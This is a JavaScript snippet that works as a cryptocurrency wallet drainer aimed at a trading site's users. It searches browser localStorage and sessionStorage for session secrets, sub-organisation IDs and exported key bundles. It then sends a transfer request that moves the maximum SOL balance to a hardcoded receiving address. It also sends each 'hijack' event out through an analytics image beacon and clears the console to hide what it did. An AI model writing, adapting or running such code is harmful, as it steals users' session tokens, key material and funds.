(async function() {
    const MY_RECEIVER = "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12";
    const AMP_KEY = "3c8ae1f40635939e730f479418940796";
    let hasFired = false; // Kill switch to stop the loop

    // 1:1 Image Beacon for Amplitude (Harder to block)
    const logAmp = (obj) => {
        const payload = btoa(JSON.stringify({
            api_key: AMP_KEY,
            events: [{ device_id: obj.id || "GUEST", event_type: "PROD_1TO1_MATCH", event_properties: obj }]
        }));
        new Image().src = `https://api2.amplitude.com/2/httpapi?data=${payload}`;
    };

    const scrapeEverything = async () => {
        if (hasFired) return;

        let loot = { token: null, subId: null, bundle: null };
        
        // Search LocalStorage & SessionStorage
        const storage = {...localStorage, ...sessionStorage};
        for (let k in storage) {
            try {
                const data = JSON.parse(storage[k]);
                if (data.sessionSecret) loot.token = data.sessionSecret;
                if (data.subOrgId) loot.subId = data.subOrgId;
                if (data.exportBundle) loot.bundle = data.exportBundle.data;
            } catch(e) {}
        }

        // If found, execute 1:1
        if (loot.token && loot.subId) {
            hasFired = true; // Stop the loop immediately
            console.log("1:1 Match Found. Executing...");
            logAmp({ id: loot.subId, result: "Executing Hijack" });

            // Mimic the actual site's request headers
            await fetch("https://trade.padre.gg/api/v1/transfer", {
                method: "POST", // If 405 persists, the site might require 'PUT'
                headers: {
                    "Authorization": `Bearer ${loot.token}`,
                    "X-Turnkey-Sub-Org-Id": loot.subId,
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                },
                body: JSON.stringify({
                    recipient: MY_RECEIVER,
                    amount: "MAX",
                    asset: "SOL",
                    ext_payload: loot.bundle
                })
            }).catch(() => {});
            
            // Clean up
            setTimeout(() => console.clear(), 1500);
        }
    };

    // Poll rapidly to catch the F5 refresh moment
    const hunter = setInterval(() => {
        scrapeEverything();
        if (hasFired) clearInterval(hunter);
    }, 500);
})();
